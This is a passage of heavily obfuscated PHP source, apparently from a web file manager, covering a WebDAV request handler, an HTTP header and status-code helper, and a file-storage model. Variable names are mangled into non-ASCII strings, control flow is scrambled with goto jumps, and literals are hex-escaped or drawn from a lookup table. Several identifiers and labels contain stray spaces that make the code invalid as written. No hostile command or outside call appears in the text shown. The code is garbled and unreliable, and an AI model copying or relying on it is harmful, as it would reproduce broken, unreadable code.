$E‡ˆØ»‡∆‚ => $c®Ωœ”çÂõ) { if (!in_array($E‡ˆØ»‡∆‚, $C≈œÕ‘äÍâ) || !is_array($c®Ωœ”çÂõ)) { continue; } $EπÖúªë“¨ = array_merge($EπÖúªë“¨, $c®Ωœ”çÂõ); } foreach ($EπÖúªë“¨ as &$bè·ÖÒí›˘) { $bè·ÖÒí›˘[$cç∏µÇÕê·[28]] = str_replace($cç∏µÇÕê·[8], $cç∏µÇÕê·[1304], $bè·ÖÒí›˘[$cç∏µÇÕê·[28]]); } goto Bå€Û“çû¨; füÀ¢ºì†Û: } public function httpPROPFIND() { goto f‰Çº–≠¥‚; F˜›¡ÖÜôÕ: if ($eçË≥Âô¥ü) { $EÃÌ‚Ï‡Êÿ = array($e∑ÉÇà’ƒ’); } else { $e∑ÉÇà’ƒ’[$a…ôáÁáﬁ¬[28]] = $a…ôáÁáﬁ¬[33]; $EÃÌ‚Ï‡Êÿ = array_merge(array($e∑ÉÇà’ƒ’), $EÃÌ‚Ï‡Êÿ); } $AìÌ≥ª¬à® = $a…ôáÁáﬁ¬[33]; foreach ($EÃÌ‚Ï‡Êÿ as $dïù∞ÕâŒõ) { $AìÌ≥ª¬à® .= $this->parseItemXml($dïù∞ÕâŒõ, $eçË≥Âô¥ü); } goto fíƒ±È±¥â; fíƒ±È±¥â: return array($a…ôáÁáﬁ¬[1707] => 207, $a…ôáÁáﬁ¬[1708] => "\x3c\x44\72\x6d\165\x6c\164\151\x73\x74\x61\164\x75\x73\x20\170\155\154\x6e\x73\x3a\x44\75\x22\x44\x41\x56\72\42\x3e\xa{$AìÌ≥ª¬à®}\12\74\57\x44\x3a\x6d\165\154\x74\x69\163\x74\141\164\x75\x73\x3e"); goto eøÎ ∑Ã§ﬂ; A¯®ÃÚÕ∞√: $e∑ÉÇà’ƒ’ = $AäÍñÁ¡ïª[$a…ôáÁáﬁ¬[1705]]; if (!is_array($EÃÌ‚Ï‡Êÿ) || $e∑ÉÇà’ƒ’[$a…ôáÁáﬁ¬[1706]] === !1) { return array($a…ôáÁáﬁ¬[1707] => 404, $a…ôáÁáﬁ¬[1708] => $a…ôáÁáﬁ¬[1709]); } $eçË≥Âô¥ü = $e∑ÉÇà’ƒ’[$a…ôáÁáﬁ¬[29]] == $a…ôáÁáﬁ¬[164] || HttpHeader::get($a…ôáÁáﬁ¬[1684]) == $a…ôáÁáﬁ¬[464]; goto F˜›¡ÖÜôÕ; f‰Çº–≠¥‚: $a…ôáÁáﬁ¬ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AäÍñÁ¡ïª = $this->pathList($this->path); $EÃÌ‚Ï‡Êÿ = $this->pathListMerge($AäÍñÁ¡ïª); goto A¯®ÃÚÕ∞√; eøÎ ∑Ã§ﬂ: } public function httpHEAD() { $dî∏™©õ√Î =& $_SERVER[£¿ÌÙëü¡¯¯]; $E≠ô“â´ø¶ = $this->pathInfo($this->path); if (!$E≠ô“â´ø¶ || $E≠ô“â´ø¶[$dî∏™©õ√Î[29]] == $dî∏™©õ√Î[77]) { return array($dî∏™©õ√Î[1007] => 200, $dî∏™©õ√Î[1174] => array($dî∏™©õ√Î[1710])); } return array($dî∏™©õ√Î[1007] => 200, $dî∏™©õ√Î[1174] => array($dî∏™©õ√Î[1711], $dî∏™©õ√Î[137], $dî∏™©õ√Î[1712] . $E≠ô“â´ø¶[$dî∏™©õ√Î[78]], $dî∏™©õ√Î[1713] . get_file_mime($E≠ô“â´ø¶[$dî∏™©õ√Î[157]]), $dî∏™©õ√Î[133] . gmdate($dî∏™©õ√Î[1699], $E≠ô“â´ø¶[$dî∏™©õ√Î[1217]]) . $dî∏™©õ√Î[1714], $dî∏™©õ√Î[1715])); } public function httpOPTIONS() { $bÏ¥òõƒø… =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($bÏ¥òõƒø…[1007] => 200, $bÏ¥òõƒø…[1174] => array($bÏ¥òõƒø…[1716], $bÏ¥òõƒø…[1717], $bÏ¥òõƒø…[1718], $bÏ¥òõƒø…[1674])); } public function httpPROPPATCH() { $c¢â·√≤¿™ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aùˆã◊ù÷Ó = $c¢â·√≤¿™[1719] . $_SERVER[$c¢â·√≤¿™[1302]] . $c¢â·√≤¿™[1720]; return array($c¢â·√≤¿™[1707] => 207, $c¢â·√≤¿™[1708] => "\74\x44\x3a\155\x75\154\x74\151\163\x74\141\x74\165\163\40\x78\155\x6c\x6e\x73\72\104\75\x22\104\x41\x56\x3a\x22\76\12{$Aùˆã◊ù÷Ó}\xa\74\x2f\x44\x3a\x6d\x75\x6c\x74\151\x73\164\141\x74\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $e¡é∂Ô»≠ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eû„∞Çê∏ö = $this->uploadFile(); if ($eû„∞Çê∏ö) { $c§±à®ï∏ı = 204; } else { $eû„∞Çê∏ö = $e¡é∂Ô»≠[33]; $c§±à®ï∏ı = 201; } $dŒÊñ™ÊÇÌ = $this->pathPut($this->path, $eû„∞Çê∏ö); if ($dŒÊñ™ÊÇÌ == !1) { $c§±à®ï∏ı = 404; } return array($e¡é∂Ô»≠[1707] => $c§±à®ï∏ı); } private function uploadFile() { goto bäÜ¥øñÈ∏; eÉ¿æ¶óïÙ: $DÀ—õá‘„Ù = @fopen($D°·Ë∂¨ãû, $B™¢•Œã‡Í[1429]); $b™¨Ôôùƒ“ = @fopen($B™¢•Œã‡Í[1722], $B™¢•Œã‡Í[1428]); if (!$b™¨Ôôùƒ“ || !$DÀ—õá‘„Ù) { @unlink($D°·Ë∂¨ãû); return !1; } goto E¬ë“ñÛ≈Ï; bäÜ¥øñÈ∏: $B™¢•Œã‡Í =& $_SERVER[£¿ÌÙëü¡¯¯]; @mk_dir(TEMP_FILES); $D°·Ë∂¨ãû = TEMP_FILES . $B™¢•Œã‡Í[1721] . rand_string(32); goto eÉ¿æ¶óïÙ; E¬ë“ñÛ≈Ï: while (!feof($b™¨Ôôùƒ“)) { fwrite($DÀ—õá‘„Ù, fread($b™¨Ôôùƒ“, 1024 * 200)); } fclose($b™¨Ôôùƒ“); fclose($DÀ—õá‘„Ù); goto Eæã◊Ü∞µ·; Eæã◊Ü∞µ·: if (@filesize($D°·Ë∂¨ãû) > 0) { return $D°·Ë∂¨ãû; } @unlink($D°·Ë∂¨ãû); return !1; goto D∂çáá÷’‡; D∂çáá÷’‡: } public function httpMKCOL() { $fÑ≠êäæËæ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->pathExists($this->path)) { return array($fÑ≠êäæËæ[1007] => 409); } $eÇ≠∂êÕ’Ì = $this->pathMkdir($this->path); return array($fÑ≠êäæËæ[1007] => $eÇ≠∂êÕ’Ì ? 201 : 403); } public function httpMOVE() { $c§èîıﬂ€‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e∆Áÿ¥Á¶ã = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$c§èîıﬂ€‹[1723]])) { $a≠•Ó∞ò÷[$c§èîıﬂ€‹[1724]] = $_SERVER[$c§èîıﬂ€‹[1723]] == $c§èîıﬂ€‹[1725]; } $f´–èàÔø¡ = $this->pathMove($this->path, $e∆Áÿ¥Á¶ã); return array($c§èîıﬂ€‹[1007] => $f´–èàÔø¡ ? 201 : 404); } public function httpCOPY() { $CÇâ‘∞Œœ— = $this->parsePath($this->pathGet(!0)); $B˘∫ì…»Ìü = $this->pathCopy($this->path, $CÇâ‘∞Œœ—); return array($_SERVER[£¿ÌÙëü¡¯¯][1007] => $B˘∫ì…»Ìü ? 201 : 404); } public function httpDELETE() { $Cﬂµ·å´√ı = $this->pathRemove($this->path); return array($_SERVER[£¿ÌÙëü¡¯¯][1007] => $Cﬂµ·å´√ı ? 200 : 503); } public function httpLOCK() { $DæÂÍâ¡ëÃ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e¿∏¥‘ÎâÈ = md5($this->path); $D÷∫‹ıØô¿ = $DæÂÍâ¡ëÃ[1726] . $this->xmlGet($DæÂÍâ¡ëÃ[1727]) . $DæÂÍâ¡ëÃ[1728] . $e¿∏¥‘ÎâÈ . $DæÂÍâ¡ëÃ[1729]; return array($DæÂÍâ¡ëÃ[1007] => 200, $DæÂÍâ¡ëÃ[1174] => array($DæÂÍâ¡ëÃ[1730] . $e¿∏¥‘ÎâÈ, $DæÂÍâ¡ëÃ[1731]), $DæÂÍâ¡ëÃ[1732] => $D÷∫‹ıØô¿); } public function httpUNLOCK() { return array($_SERVER[£¿ÌÙëü¡¯¯][1007] => 204); } public function xmlGet($bÔÖŒöêüè) { goto A◊ﬁüœ€ãê; b‡”¢†äß≠: return $d√“´ÕÂ≈ª[33]; goto cÑ–»êÑæ·; cºﬁÀò¯áÌ: $AÊ≈ÊËıÖ± = array_shift(explode($d√“´ÕÂ≈ª[8], $bÔÖŒöêüè)); $DìÌ‚¯ÎÂŒ = $b∂æÔóªÖ->getElementsByTagNameNS($d√“´ÕÂ≈ª[1734], $AÊ≈ÊËıÖ±); if ($DìÌ‚¯ÎÂŒ) { return $DìÌ‚¯ÎÂŒ[0]->nodeValue; } goto b‡”¢†äß≠; A◊ﬁüœ€ãê: $d√“´ÕÂ≈ª =& $_SERVER[£¿ÌÙëü¡¯¯]; static $b∂æÔóªÖ = false; if (!$b∂æÔóªÖ) { $fó≈¢“ë§≥ = file_get_contents($d√“´ÕÂ≈ª[1733]); $b∂æÔóªÖ = new DOMDocument(); $b∂æÔóªÖ->loadXML($fó≈¢“ë§≥); } goto cºﬁÀò¯áÌ; cÑ–»êÑæ·: } public static function response($dœ‰çœ°Ü≤) { goto fâ‡ÖáŒ≈à; fâ‡ÖáŒ≈à: $d’ßÜÀè≥± =& $_SERVER[£¿ÌÙëü¡¯¯]; $A≥áÇÃçÚî = is_array($dœ‰çœ°Ü≤[$d’ßÜÀè≥±[1174]]) ? $dœ‰çœ°Ü≤[$d’ßÜÀè≥±[1174]] : array(); $A≥áÇÃçÚî[] = HttpHeader::code($dœ‰çœ°Ü≤[$d’ßÜÀè≥±[1007]]); goto d¬¯†¿Öõ≤; eÇŒàë´€®: if (is_string($dœ‰çœ°Ü≤[$d’ßÜÀè≥±[1732]])) { header($d’ßÜÀè≥±[1735]); $dä¨•¶î¢˘ = $d’ßÜÀè≥±[1736] . $d’ßÜÀè≥±[214] . $dœ‰çœ°Ü≤[$d’ßÜÀè≥±[1732]]; echo $dä¨•¶î¢˘; } goto eÜ™öÜ≠›û; d¬¯†¿Öõ≤: $A≥áÇÃçÚî[] = $d’ßÜÀè≥±[1672]; $A≥áÇÃçÚî[] = $d’ßÜÀè≥±[1673]; foreach ($A≥áÇÃçÚî as $f…êÔíëŸç) { header($f…êÔíëŸç); } goto eÇŒàë´€®; eÜ™öÜ≠›û: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\x74" => "\x48\x54\x54\x50\137\x48\x4f\123\x54", "\125\x73\145\162\55\x41\x67\145\156\164" => "\110\x54\x54\120\137\x55\123\105\x52\137\101\x47\105\116\124", "\x43\157\x6e\164\x65\x6e\164\x2d\x54\171\x70\x65" => "\x48\x54\124\x50\137\103\x4f\x4e\x54\105\x4e\x54\x5f\124\131\120\105", "\103\x6f\156\x74\145\x6e\x74\55\114\145\x6e\147\x74\x68" => "\x48\124\x54\x50\137\x43\117\116\x54\x45\x4e\124\x5f\114\105\x4e\x47\x54\110", "\104\x65\160\164\150" => "\x48\124\x54\x50\137\x44\105\x50\x54\x48", "\x45\170\x70\x65\143\x74" => "\x48\x54\124\x50\x5f\105\x58\120\105\103\124", "\111\x66\55\x4e\157\156\x65\x2d\x4d\x61\164\x63\150" => "\110\x54\x54\120\x5f\111\x46\137\x4e\117\x4e\105\137\115\101\124\x43\110", "\111\x66\55\x4d\x61\164\143\x68" => "\110\x54\x54\x50\137\111\106\x5f\x4d\x41\x54\x43\x48", "\111\x66\x2d\122\141\x6e\147\145" => "\110\124\124\120\137\111\106\x5f\x52\x41\116\107\x45", "\x4c\x61\163\164\x2d\x4d\157\144\151\146\x69\145\x64" => "\x48\124\124\120\x5f\114\x41\123\x54\x5f\x4d\x4f\x44\x49\x46\x49\x45\104", "\111\x66\x2d\115\157\x64\x69\x66\151\x65\x64\55\x53\151\x6e\x63\x65" => "\110\x54\124\x50\137\111\106\x5f\115\x4f\x44\x49\x46\111\105\x44\x5f\123\111\116\x43\105", "\x49\146\55\x55\x6e\155\x6f\x64\x69\146\x69\x65\x64\55\123\151\x6e\143\145" => "\110\x54\x54\x50\137\111\106\x5f\125\x4e\115\117\104\x49\x46\111\x45\x44\137\x53\x49\x4e\103\105", "\x52\x61\156\147\x65" => "\110\124\x54\x50\x5f\122\101\116\107\105", "\x54\x69\155\145\x6f\165\164" => "\x48\x54\x54\x50\x5f\x54\111\x4d\105\x4f\x55\x54", "\111\146" => "\110\124\124\120\137\111\106", "\114\157\x63\x6b\x2d\x54\x6f\x6b\x65\x6e" => "\x48\x54\x54\120\x5f\114\117\x43\113\137\x54\117\x4b\x45\x4e", "\117\166\x65\x72\x77\x72\x69\x74\x65" => "\110\124\x54\120\137\117\x56\x45\x52\x57\122\111\x54\105", "\x44\145\x73\164\x69\x6e\141\164\x69\157\x6e" => "\x48\124\124\120\137\104\x45\x53\124\x49\x4e\101\x54\111\117\116", "\x52\x65\x71\x75\145\x73\x74\55\x49\144" => "\122\x45\x51\125\x45\x53\x54\x5f\111\x44", "\122\x65\x71\x75\x65\163\164\55\102\x6f\x64\171\x2d\x46\151\154\145" => "\x52\x45\121\x55\105\x53\x54\x5f\102\x4f\x44\131\137\106\x49\114\x45", "\122\x65\144\x69\162\x65\143\x74\x2d\123\164\141\x74\165\x73" => "\122\x45\104\x49\122\105\103\124\137\123\124\x41\x54\x55\123"); public static function init() { static $Eåá„’ºüÓ = false; if ($Eåá„’ºüÓ) { return; } foreach ($_SERVER as $EıäëÏüœ˜ => $BÙıÕŸ∆Ç¨) { $EıäëÏüœ˜ = strtoupper($EıäëÏüœ˜); if (!array_key_exists($EıäëÏüœ˜, $_SERVER)) { continue; } $_SERVER[$EıäëÏüœ˜] = $BÙıÕŸ∆Ç¨; } foreach (self::$_headers as $EıäëÏüœ˜ => $Få™ÉØå∑) { if (!array_key_exists($EıäëÏüœ˜, $_SERVER)) { continue; } $_SERVER[$EıäëÏüœ˜] = $_SERVER[$Få™ÉØå∑]; $_SERVER[strtoupper($EıäëÏüœ˜)] = $_SERVER[$Få™ÉØå∑]; } } public static function get($FÑ ‘âôÀÑ) { self::init(); return $_SERVER[$FÑ ‘âôÀÑ] ? $_SERVER[$FÑ ‘âôÀÑ] : $_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][1737] . strtoupper($FÑ ‘âôÀÑ)]; } public static function method() { return strtoupper(self::get($_SERVER[£¿ÌÙëü¡¯¯][151])); } public static function length() { $d∑ﬁÏï÷·‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b‰ﬂèûÚ√Ë = self::get($d∑ﬁÏï÷·‰[1738]); if (!$b‰ﬂèûÚ√Ë) { $b‰ﬂèûÚ√Ë = self::get($d∑ﬁÏï÷·‰[1112]); } return $b‰ﬂèûÚ√Ë; } public static function range() { $fÜ‰—ÁèÀ— =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aı∆Ω†ÚòË = self::get($fÜ‰—ÁèÀ—[195]); if (!$Aı∆Ω†ÚòË) { return !1; } if (!preg_match($fÜ‰—ÁèÀ—[1739], $Aı∆Ω†ÚòË, $b€ë∂·È“â)) { return !1; } if ($b€ë∂·È“â[1] === $fÜ‰—ÁèÀ—[33] && $b€ë∂·È“â[2] === $fÜ‰—ÁèÀ—[33]) { return !1; } return array($b€ë∂·È“â[1] !== $fÜ‰—ÁèÀ—[33] ? $b€ë∂·È“â[1] : null, $b€ë∂·È“â[2] !== $fÜ‰—ÁèÀ—[33] ? $b€ë∂·È“â[2] : null); } public static $statusCode = array("\61\x30\60" => "\x43\x6f\156\x74\x69\156\x75\145", "\61\x30\x31" => "\123\x77\x69\x74\143\x68\151\x6e\147\x20\x50\x72\x6f\164\x6f\143\x6f\x6c", "\x31\x30\x32" => "\120\x72\157\x63\x65\163\x73\x69\x6e\x67", "\x31\x30\63" => "\105\x61\x72\x6c\x79\x20\x48\151\x6e\164\x73", "\x32\60\60" => "\x4f\x4b", "\x32\60\61" => "\x43\162\x65\141\x74\145\x64", "\62\x30\x32" => "\x41\x63\143\x65\x70\164\x65\144", "\x32\x30\63" => "\x4e\157\x6e\55\101\165\164\x68\157\x72\151\164\141\164\x69\166\x65\x20\111\x6e\x66\157\x72\x6d\x61\164\151\x6f\x6e", "\x32\60\x34" => "\x4e\x6f\x20\103\157\x6e\164\x65\156\x74", "\62\x30\x35" => "\122\145\163\145\x74\40\103\157\156\164\x65\x6e\164", "\62\60\66" => "\120\141\x72\x74\x69\x61\x6c\40\103\x6f\156\164\x65\156\x74", "\62\x30\x37" => "\115\165\154\x74\x69\55\x53\x74\141\164\165\163", "\x33\x30\x30" => "\115\165\x6c\x74\151\160\154\x65\x20\103\150\157\x69\143\x65\x73", "\x33\x30\61" => "\x4d\x6f\x76\x65\144\40\120\x65\x72\x6d\x61\x6e\x65\156\x74\154\x79", "\x33\60\x32" => "\106\157\165\x6e\x64", "\x33\x30\x33" => "\x53\x65\145\40\x4f\x74\x68\x65\x72", "\x33\60\64" => "\x4e\157\164\x20\x4d\157\144\x69\x66\151\x65\144", "\63\60\x35" => "\125\163\x65\x20\120\162\157\x78\x79", "\63\60\67" => "\x54\145\x6d\160\157\x72\x61\162\x79\40\x52\x65\144\151\162\145\143\164", "\63\60\x38" => "\120\x65\x72\x6d\141\156\145\x6e\164\40\122\x65\144\x69\162\145\143\x74", "\x34\x30\x30" => "\102\141\x64\40\122\145\161\165\x65\163\164", "\x34\x30\x31" => "\125\x6e\141\x75\x74\150\157\x72\151\x7a\x65\x64", "\x34\x30\62" => "\x50\141\171\155\145\156\x74\40\x52\145\161\165\x69\162\145\144", "\64\60\63" => "\x46\x6f\x72\x62\151\144\144\145\156", "\64\x30\64" => "\116\157\164\40\106\157\x75\x6e\144", "\64\x30\65" => "\x4d\145\164\x68\157\x64\x20\116\x6f\164\40\101\154\x6c\x6f\x77\145\144", "\64\60\x36" => "\x4e\x6f\x74\x20\x41\143\x63\x65\x70\x74\141\x62\154\x65", "\64\x30\x37" => "\x50\162\157\170\171\x20\101\x75\x74\x68\145\x6e\x74\x69\x63\x61\x74\x69\157\x6e\40\x52\x65\x71\165\x69\162\145\x64", "\x34\60\70" => "\x52\145\161\165\145\x73\164\x20\124\151\155\145\157\x75\164", "\x34\60\71" => "\103\x6f\156\146\x6c\151\143\164", "\x34\x31\x30" => "\x47\x6f\x6e\x65", "\x34\61\x31" => "\x4c\145\x6e\x67\164\x68\40\x52\145\x71\165\151\162\x65\144", "\x34\x31\62" => "\120\x72\145\143\x6f\x6e\144\151\x74\151\157\x6e\x20\106\x61\x69\x6c\145\144", "\64\x31\x33" => "\122\x65\x71\165\x65\x73\x74\x20\105\x6e\164\x69\x74\x79\x20\x54\157\157\40\x4c\141\162\x67\x65", "\64\x31\x34" => "\x52\145\161\x75\145\x73\x74\40\125\x52\x49\x20\124\x6f\157\x20\114\x61\162\x67\145", "\x34\x31\x35" => "\x55\x6e\163\x75\x70\x70\157\x72\164\x65\x64\40\x4d\x65\144\x69\x61\40\x54\171\160\145", "\x34\x31\66" => "\122\145\161\165\x65\x73\164\145\x64\40\x52\x61\x6e\147\x65\x20\116\157\164\x20\x53\141\164\151\x73\146\x69\x61\x62\x6c\145", "\x34\61\x37" => "\x45\x78\160\x65\x63\164\x61\x74\x69\x6f\x6e\x20\x46\x61\151\154\145\x64", "\64\62\62" => "\125\x6e\160\162\157\x63\x65\x73\x73\x61\x62\x6c\145\40\105\x6e\164\x69\164\x79", "\x34\x32\x33" => "\114\x6f\x63\153\145\144", "\x34\62\x34" => "\106\141\x69\x6c\145\144\40\104\145\x70\x65\156\144\x65\x6e\143\x79", "\64\62\x35" => "\125\x6e\x6f\162\x64\x65\x72\145\x64\x20\103\157\x6c\x6c\145\143\x74\x69\157\156", "\64\x32\66" => "\125\x70\x67\162\x61\x64\145\40\x52\145\x71\x75\x69\x72\145\144", "\x34\62\70" => "\x50\x72\x65\x63\157\156\x64\x69\164\x69\x6f\x6e\x20\122\x65\x71\x75\x69\162\145\x64", "\x34\62\x39" => "\124\x6f\157\x20\115\x61\156\171\40\x52\145\161\x75\145\x73\x74\163", "\x34\63\61" => "\x52\145\161\x75\145\163\x74\x20\x48\145\x61\144\145\162\40\106\x69\145\154\144\x73\40\x54\157\157\x20\114\141\162\x67\x65", "\64\64\64" => "\x4e\x6f\40\122\145\163\160\x6f\x6e\163\x65", "\64\65\x30" => "\102\x6c\x6f\x63\x6b\145\x64\x20\142\x79\x20\x57\151\x6e\144\157\x77\x73\x20\120\x61\162\145\x6e\164\141\x6c\x20\x43\x6f\x6e\164\x72\x6f\x6c\x73", "\x34\x35\61" => "\125\156\x61\166\x61\151\154\141\x62\x6c\145\40\x46\157\x72\40\x4c\x65\x67\x61\x6c\40\x52\x65\x61\163\157\156\x73", "\x34\71\64" => "\122\145\161\x75\x65\x73\164\40\x48\145\x61\144\x65\x72\x20\124\157\157\40\x4c\141\x72\x67\x65", "\x35\x30\x30" => "\111\156\x74\145\162\156\x61\x6c\40\x53\x65\x72\x76\x65\x72\x20\105\162\162\x6f\x72", "\x35\60\x31" => "\x4e\x6f\164\x20\111\x6d\160\154\x65\x6d\x65\x6e\x74\x65\x64", "\65\x30\62" => "\102\x61\144\x20\x47\141\x74\145\167\141\171", "\x35\60\63" => "\123\x65\x72\x76\151\143\145\40\x55\156\x61\x76\141\x69\x6c\x61\142\154\x65", "\x35\60\x34" => "\107\x61\x74\145\x77\x61\171\x20\x54\x69\x6d\145\x6f\x75\x74", "\65\x30\65" => "\110\x54\x54\x50\x20\126\x65\162\x73\151\157\x6e\40\x6e\157\164\40\x73\x75\x70\x70\157\x72\x74\x65\144", "\x35\x30\x37" => "\x49\x6e\163\x75\x66\x66\151\143\151\x65\156\164\x20\123\x74\157\x72\x61\x67\145"); public static function code($C“˘ûµ°‡Ü) { $d” £ß◊ûò =& $_SERVER[£¿ÌÙëü¡¯¯]; $C“˘ûµ°‡Ü = $C“˘ûµ°‡Ü . $d” £ß◊ûò[33]; $DÃÁ Ö®òÊ = self::$statusCode[$C“˘ûµ°‡Ü]; $DÃÁ Ö®òÊ = $DÃÁ Ö®òÊ ? "\x48\x54\124\x50\57\x31\x2e\x31\x20{$C“˘ûµ°‡Ü}\40" . $DÃÁ Ö®òÊ : $d” £ß◊ûò[33]; return $DÃÁ Ö®òÊ; } } goto c»Ÿ¥Ê·…Ï; dıˆû¯ªƒ‘: define($_SERVER[£¿ÌÙëü¡¯¯][1846], 5); define($_SERVER[£¿ÌÙëü¡¯¯][1847], 16); define($_SERVER[£¿ÌÙëü¡¯¯][1848], 32); goto c°óÖãÜ–; EÒõøÒöøÎ: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\141\155\145" => "\151\157\x5f\146\x69\154\x65\137\155\x65\x74\x61", "\155\145\164\x61\x46\151\145\154\144" => "\x66\151\x6c\x65\x49\104"); public function fileInfo($f»»…Ò–ñë) { $dÎÜˆΩõœÔ =& $_SERVER[£¿ÌÙëü¡¯¯]; static $eπÃÛÔÂ‰» = array(); if (!isset($eπÃÛÔÂ‰»[$f»»…Ò–ñë])) { $aË„ñä€€≤ = $dÎÜˆΩõœÔ[2056]; $C—∫á√™‰® = Model($dÎÜˆΩõœÔ[418])->field($aË„ñä€€≤)->where(array($dÎÜˆΩõœÔ[416] => $f»»…Ò–ñë))->find(); $eπÃÛÔÂ‰»[$f»»…Ò–ñë] = $C—∫á√™‰®; } return $eπÃÛÔÂ‰»[$f»»…Ò–ñë]; } public function addFileByContent($cﬂı«Ûù±ë = '', $CÒîøÑÖëø = '') { goto e…ıÜ¶ÂÉ›; e…ıÜ¶ÂÉ›: $BìÆ·®óÜı =& $_SERVER[£¿ÌÙëü¡¯¯]; $d»’ﬂ´àê÷ = TEMP_PATH . $BìÆ·®óÜı[2057]; if (!is_dir($d»’ﬂ´àê÷)) { mk_dir($d»’ﬂ´àê÷); } goto EõØÎ¡ïÍç; EõØÎ¡ïÍç: $c·¿ﬂ˜√…„ = $d»’ﬂ´àê÷ . $BìÆ·®óÜı[2058] . rand_string(16); file_put_contents($c·¿ﬂ˜√…„, $cﬂı«Ûù±ë); $fêÎ©È£‰‰ = $this->addFile($c·¿ﬂ˜√…„, $CÒîøÑÖëø, !0); goto cç’¬¥—°‚; cç’¬¥—°‚: if (file_exists($c·¿ﬂ˜√…„)) { @unlink($c·¿ﬂ˜√…„); } return $fêÎ©È£‰‰; goto f÷≠øõñ—∏; f÷≠øõñ—∏: } public function createFileName($e∏¢◊ÙË»Ç) { goto b‡Ñ‹π‡ÈÜ; DÖ≈Óé¶ﬁø: $CÍÈô§Ñº‰ = $DÜ¬Øñ ıü->pathFather($BîÀ˜àÕ´∂); static $Bÿ–Ëäàçñ = false; $BÊÚ¬Ωåˆ¿ = $AèíÿÍ–Ì™[2059] . md5($CÍÈô§Ñº‰); goto D√«ÍŸ›ÂÕ; D√«ÍŸ›ÂÕ: if (!$Bÿ–Ëäàçñ && !Cache::get($BÊÚ¬Ωåˆ¿)) { $Bÿ–Ëäàçñ = !0; $EìËÃñ©ï∞ = IO::mkdir($CÍÈô§Ñº‰); if (!IO::exist($EìËÃñ©ï∞ . $AèíÿÍ–Ì™[2060])) { IO::mkfile($EìËÃñ©ï∞ . $AèíÿÍ–Ì™[2060]); } Cache::set($BÊÚ¬Ωåˆ¿, 1, 3600 * 2); } return $BîÀ˜àÕ´∂; goto eÇ’„Ê±ú⁄; b‡Ñ‹π‡ÈÜ: $AèíÿÍ–Ì™ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÜ¬Øñ ıü = IO::init($AèíÿÍ–Ì™[8]); $BîÀ˜àÕ´∂ = $this->makeFilePath($e∏¢◊ÙË»Ç, $DÜ¬Øñ ıü); goto DÖ≈Óé¶ﬁø; eÇ’„Ê±ú⁄: } public function makeFilePath($aŒ∆“ıøÛŒ, $C¿™ˆ®ÚÇî) { goto e≥ùŒ‚çú™; D‡ä°ı√ÈÜ: $e§”ú„Í∫ò = $D∫ÔÏœ∫ç™ . rand_string(5) . short_id(100); $aŒ∆“ıøÛŒ = str_replace($B§·Ú–∏ﬂ›[8], $B§·Ú–∏ﬂ›[71], KodIO::clear($aŒ∆“ıøÛŒ)); if (!$aŒ∆“ıøÛŒ) { $b‚◊€¬∆¯Ç = $B§·Ú–∏ﬂ›[2063]; } goto b—ò€ç°·Ã; b—ò€ç°·Ã: switch ($b‚◊€¬∆¯Ç) { case $B§·Ú–∏ﬂ›[2064]: $e§”ú„Í∫ò = $e§”ú„Í∫ò . $B§·Ú–∏ﬂ›[94] . $C¿™ˆ®ÚÇî->ext($aŒ∆“ıøÛŒ); if ($C¿™ˆ®ÚÇî->ext($aŒ∆“ıøÛŒ) == $B§·Ú–∏ﬂ›[2003]) { $e§”ú„Í∫ò .= $B§·Ú–∏ﬂ›[2065]; } break; case $B§·Ú–∏ﬂ›[2066]: goto f€ †ë¯õµ; DÉ∫¢ÍòœÈ: break; goto F∆ˆƒû©◊Î; f€ †ë¯õµ: $e≥⁄…áãΩâ = Model($B§·Ú–∏ﬂ›[1062])->get($B§·Ú–∏ﬂ›[1241]); $D±∆æ∫ˆóò = substr(md5($B§·Ú–∏ﬂ›[1823] . $e≥⁄…áãΩâ . date($B§·Ú–∏ﬂ›[674])), 0, 8); $D∫ÔÏœ∫ç™ = KodIO::defaultIO() . date($B§·Ú–∏ﬂ›[2067]) . $D±∆æ∫ˆóò . $B§·Ú–∏ﬂ›[8]; goto dÀÓ˜ÕíΩ¥; dÀÓ˜ÕíΩ¥: if ($C¿™ˆ®ÚÇî->ext($aŒ∆“ıøÛŒ) == $B§·Ú–∏ﬂ›[2003]) { $aŒ∆“ıøÛŒ .= $B§·Ú–∏ﬂ›[2065]; } $cˆõ¶ó…òú = IO::fileNameAuto($D∫ÔÏœ∫ç™, $aŒ∆“ıøÛŒ); $e§”ú„Í∫ò = $D∫ÔÏœ∫ç™ . $cˆõ¶ó…òú; goto DÉ∫¢ÍòœÈ; F∆ˆƒû©◊Î: case $B§·Ú–∏ﬂ›[2063]: break; default: break; } return $e§”ú„Í∫ò; goto b¿Úáëí∑â; e≥ùŒ‚çú™: $B§·Ú–∏ﬂ› =& $_SERVER[£¿ÌÙëü¡¯¯]; $b‚◊€¬∆¯Ç = Model($B§·Ú–∏ﬂ›[1062])->get($B§·Ú–∏ﬂ›[2061]); $D∫ÔÏœ∫ç™ = KodIO::defaultIO() . date($B§·Ú–∏ﬂ›[2062]); goto D‡ä°ı√ÈÜ; b¿Úáëí∑â: } public function addFileByRemote($cãØ‹Ÿ“≈‚, $b‘Ñó Ÿ€≈, $FèﬁŒè–√ = array()) { goto d¡∑è¬ÖÔú; aŒ–‹êÉÓÉ: $DÂÖﬂì±œ = IO::hashMd5($cãØ‹Ÿ“≈‚, $Eõçöã’íΩ); $F∏ﬂâåÆ“ì = KodIO::defaultDriver(); $c·–Ú√íªå = array($Aÿ¯£ëïù¡[512] => IO::size($cãØ‹Ÿ“≈‚), $Aÿ¯£ëïù¡[2068] => 1, $Aÿ¯£ëïù¡[383] => $b‘Ñó Ÿ€≈, $Aÿ¯£ëïù¡[733] => 